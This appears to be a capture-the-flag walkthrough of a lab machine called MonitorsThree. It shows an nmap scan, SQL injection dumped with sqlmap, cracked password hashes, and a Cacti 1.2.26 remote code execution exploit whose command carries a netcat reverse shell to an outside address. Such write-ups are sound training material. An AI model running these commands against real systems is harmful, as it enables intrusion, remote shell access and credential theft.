```text
Nmap scan report for 10.10.11.30
Host is up (0.025s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.67 seconds
```

&nbsp;

# SQL Injection

There is SQL injection on the forgot password page here:

![87a47714dbabb2c8a2718f6dffba59dc.png](../../../../_resources/87a47714dbabb2c8a2718f6dffba59dc.png)

Verified with the input '.

It might be blind, which would be somewhat difficult.

I captured the request sent via burpsuite and put it into a txt file, then used sqlmap to dump the contents of the database:

![f8705210e7dd5cec47d6ec19f2b9fbd0.png](../../../../_resources/f8705210e7dd5cec47d6ec19f2b9fbd0.png)

This allowed me to acquire 4 hashes:

```
sqlmap -r post.txt --dump
```

```
dthompson@monitorsthree.htb:633b683cc128fe244b00f176c8a950f5
janderson@monitorsthree.htb:1e68b6eb86b45f6d92f8f292428f77ac
mwatson@monitorsthree.htb:c585d01f2eb3e6e1073e92023088a3dd
admin@monitorsthree.htb:31a181c8372e3afc59dab863430610e8:greencacti2001
```

I then attempted to crack the hashes via hashcat, however only one was successful:

![1735c8eea85caf68dbaeebd7ec9ccfa0.png](../../../../_resources/1735c8eea85caf68dbaeebd7ec9ccfa0.png)

We now have the credentials for admin@monitorsthree.htb.

&nbsp;

# Cacti

I found a cacti subdomain:

![23d1d19eea398363b2d2b09fda498b28.png](../../../../_resources/23d1d19eea398363b2d2b09fda498b28.png)

Add this to /etc/hosts.

We now have access to cacti with the admin credentials:

![729b187df6d1fb53dace4f0e404a9b80.png](../../../../_resources/729b187df6d1fb53dace4f0e404a9b80.png)

Cacti 1.2.26 suffers from rce via import template.

https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26

```
my-venv/bin/python3 CVE-2024-25641.py --user admin --pass greencacti2001 --cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 4444 >/tmp/f" http://cacti.monitorsthree.htb/cacti/
```

![19df152b8325579e01ff1d6f670f08e8.png](../../../../_resources/19df152b8325579e01ff1d6f670f08e8.png)

&nbsp;

Marcus is a user of cacti, and is also the only user on the machine:

![434874204e3549add6b2dfb00dc84d00.png](../../../../_resources/434874204e3549add6b2dfb00dc84d00.png)

Now we have access to the machine, I find the sql database has the base cactiuser enabled, meaning we should be able to auth as that user and access the hashed credentials of marcus which we could then attempt to crack.

![e7de064f30575ba6f4a8606986748179.png](../../../../_resources/e7de064f30575ba6f4a8606986748179.png)

Maybe crackable?